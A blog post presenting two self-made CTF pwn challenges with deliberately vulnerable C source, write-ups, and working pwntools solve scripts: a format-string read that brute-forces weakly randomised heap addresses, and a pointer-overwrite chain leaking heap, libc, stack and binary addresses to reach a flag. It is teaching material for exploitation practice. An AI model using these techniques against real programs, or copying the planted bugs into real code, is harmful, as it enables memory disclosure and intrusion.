---
layout: post
title: "My Imaginary CTF Challenges"
date: 2022-10-17
categories: ctf pwn c python
---

# Intro
Recently I was daydreaming about what pwn challenges would I do if I
had an oppurtunity to co-organize a ctf competition. Maybe I should
keep those ideas to myself if such oppurtunity would arise but
currently I don't even have a team and I want them to be out
there. They are based on some observations that I made while playing
sekaiCTF this week, which was great and kudos to the organizers! More
precisily they are based on the saveme challenge which was the easiest pwn
one. The challenges that I made aren't hard and I would classify them
as hard beginner ones or easy intermediate ones. You could
probably make them a bit harder by making the exploitation scenarios
more complex but I mostly care about the ideas. You can download and
try to solve them yourself before reading the explanations. I made
them using glibc 2.35 on fedora 36. If you want to solve those challenges
yourself you can download the library, linker and challenges there:
- [glibc](/files/libc.so.6)
- [linker](/files/ld-linux-x86-64.so.2)
- [Challenge 1](/files/insanity)
- [Challenge 2](/files/leakleakleak)

# Chall 1
name: Insanity

Description: What was the definition of insanity again?

## Writeup
It turns out aslr of the first heap created with the brk syscall on
linux is pretty weak... by weak I mean it relies on the binary address
because the heap is placed below it with an offset and the offset
added seems to be in a pretty small range. By running gdb a bunch of
times it looks like the offset is in range 0-0x1fff (don't quote me on
this though). Normally the binary address has 24 bits of randomness
(or entropy if you want to sound smart) but what if the binary has
no-pic? The offset range stays the same! You can bruteforce the heap
address because you already know the binary address! This was a big
surprise for me. I didn't came up with this myself but after the ctf I
mentioned above ended, people posted their solutions on Discord and
this was used in an unintendent solution by someone. Is this a good
ctf challenge? I don't know, not for the infrastructure for sure.

challenge source code:
```c
#include <stdio.h>
#include <stdlib.h>

// compile commands: gcc insanity.c -o insanity -fno-pic

int main() {
  char *flag = malloc(128);
  
  FILE *flag_file = fopen("./flag.txt", "r");
  fseek(flag_file, 0, SEEK_END);
  long flag_size = ftell(flag_file);
  fseek(flag_file, 0, SEEK_SET);
  
  fread(flag, 1, flag_size, flag_file);
  flag[flag_size] = '\00';

  // not that easy :>
  flag = NULL;

  printf("Whats your name? ");
  char name[64] = {0};
  scanf("%63s", name);

  for (size_t i = 0; i < sizeof(name); ++i)
    if (name[i] == 'n' || name[i] == 'N') {
      printf("I hate the letter N!!!");
      exit(-1);
    }

  printf("nice name, ");
  printf(name);
  printf("! =]\n");
  
  return 0;
}
```

Solution:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./insanity")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.sendline(b'%7$s----' + p64(0xf48510))
    try:
        o = r.recvuntil(b'=]', 0)
    except EOFError:
        o = b''
    
    if b'fl' in o:
        while True:
            print(o)

    r.close()


if __name__ == "__main__":
    i = 0
    while True:
        main()
        i += 1
        print(i)
```

For some reasons spawning or killing or whatever the processes in the
solve.py above can take a lot of time on my machine so it's nice to
"parallelize" the program by launching 8 terminals running this
script. :P

# Chall 2
name: leakleakleak

Description: Leak, leak, leak, leak, I want you in my leak!

## Writeup
This challenge is based on my solution for saveme which was I guess
unintendent. Saveme was about a string format vuln where at the
beginning the program mmaped some memory with all permissions (rwx),
so you were supposed to put your shellcode there and do stuff. You had
to use shellcode (or some complicated rop chain) because of
seccomp. Also the flag was placed on the heap so you had to get its
address with your shellcode. My mind somehow forgot about the mmaped
memory and I went for something a little bit different. =D My solution
was basically: leak libc and overwrite ret addr to main -> leak heap
addr from `main_arena` and goto main again -> leak heap memory which
is the flag.

If you havent studied ptmalloc, `main_arena` is a struct in glibc that
holds some info about the "main" heap. I recommend reading about
ptmalloc's internals there:
[link](https://sourceware.org/glibc/wiki/MallocInternals). It's
probably something that all pwners understand subconsiously but it
made me think about what addresses can you leak from which memory
segments in general. So I made a silly diagram. BEHOLD...

![diagram](/files/diagram.png)

Don't take this diagram too seriously... you could argue if any arrows
should even be red especially on bigger software however I focus on
smaller ctf challenges. Green arrows mean that you can leak this
address from there almost 100%. Orange arrows mean that you can
sometimes leak it from there but that's not always the case. Red
arrows mean that you aren't supposed to leak it from there in my
opinion but sometimes shit happens, badly written code, stuff like
that. There are some exceptions that I can think of that aren't
'shitty code' though, like some invalid cache for example.

From the stack you can leak everything given an infinite read, I guess
the stack is like a hub from where almost all values go through.

From libc you can leak heap from structures like `main_arena`, and
stack from `__environ`. There are also `FILE` structs for `stdin`,
`stdout` and `stderr` and they hold a bunch of pointers to things like
where they recently readed from/writed to etc so in theory they can
point anywhere.

From the binary you can leak libc through the `.got` table and maybe
there will be some heap addresses in global variables in the
`.data` or `.bss` sections.

From the heap you should be able to leak libc as there are usually
pointers to libc because of how ptmalloc works. There are doubly
linked list's nodes of free bins on the heap to allocate to and they
can point to the head which part of libc's global variables. Also
maybe some allocated memory could hold pointers to global variables
from the executable.

So the solution is about leaking:
- heap addr from stack
- libc addr from heap
- stack addr from libc
- binary addr from stack
- binary data from binary addr

I never saw a challenge like that and I think it's pretty cool.

Challenge source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

// compile commands: gcc leakleakleak.c -o leakleakleak -fpie -pie

char flag[128] = {0};

typedef struct {
  char username[32];
  char *description;
} User;

void warmup_heap(void) {
  void *addrs[3];
  for (size_t i = 0; i < 3; ++i) {
    addrs[i] = malloc(9000);
  }

  free(addrs[1]);
}

User *create_user(void) {
  User *user = calloc(1, sizeof(User));
  user->description = calloc(1, 256);
  return user;
}

void destroy_user(User *user) {
  free(user->description);
  free(user);
}

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  int flag_fd = open("./flag.txt", O_RDONLY);
  
  off_t flag_size = lseek(flag_fd, 0, SEEK_END);
  lseek(flag_fd, 0, SEEK_SET);

  read(flag_fd, flag, flag_size);
  
  flag[flag_size] = '\00';

  warmup_heap();

  User *user = create_user();

  for (_Bool quit = 0; !quit; ) {
    printf("What is your name? ");
    read(STDIN_FILENO, user, sizeof(*user));
    printf("Hello %s!\n", user->username);
      
    printf("Let me tell something about yourself! :3\n");
    printf("%s\n", user->description);
    
    printf("Continue? (Y/n) ");
    char c = getchar();
    if (c == 'n' || c == 'N')
      quit = 1;
  }

  printf("Boom! Boom, boom, boom! I want YOU in my room!\n");
  
  destroy_user(user);
  return 0;
}
```

Solution: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./leakleakleak_patched")

context.binary = exe
context.terminal = ['alacritty', '-e']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.sendline(b'A' * 32)
    r.recvuntil(b'Hello ')
    r.recvuntil(b'\n')
    heap_leak = (b'\x00' + r.recvuntil(b'!\n')[:-2]).ljust(8, b'\x00')
    heap_leak = u64(heap_leak)
    info(f'heap leak: {hex(heap_leak)}')

    libc_addr = heap_leak + 0x110
    r.sendafter(b'Continue?', b'Y')
    r.sendafter(b'name', b'A' * 32 + p64(libc_addr))

    r.recvuntil(b':3\n')
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    info(f'libc leak: {hex(libc_leak)}')

    stack_addr = libc_leak + 0x7027
    r.sendafter(b'Continue?', b'Y')
    r.sendafter(b'name', b'A' * 32 + p64(stack_addr))

    r.recvuntil(b':3\n')
    stack_leak = u64(r.recv(6).ljust(8, b'\x00'))
    info(f'stack leak: {hex(stack_leak)}')

    bin_addr = stack_leak - 0x150
    r.sendafter(b'Continue?', b'Y')
    r.sendafter(b'name', b'A' * 32 + p64(bin_addr))

    r.recvuntil(b':3\n')
    bin_leak = u64(r.recv(6).ljust(8, b'\x00'))
    info(f'bin leak: {hex(bin_leak)}')

    flag_addr = bin_leak + 0x2d1e
    info(f'flag addr: {hex(flag_addr)}')
    r.sendafter(b'Continue?', b'Y')
    r.sendafter(b'name', b'A' * 32 + p64(flag_addr))

    r.recvuntil(b':3\n')
    
    r.interactive()


if __name__ == "__main__":
    main()
```
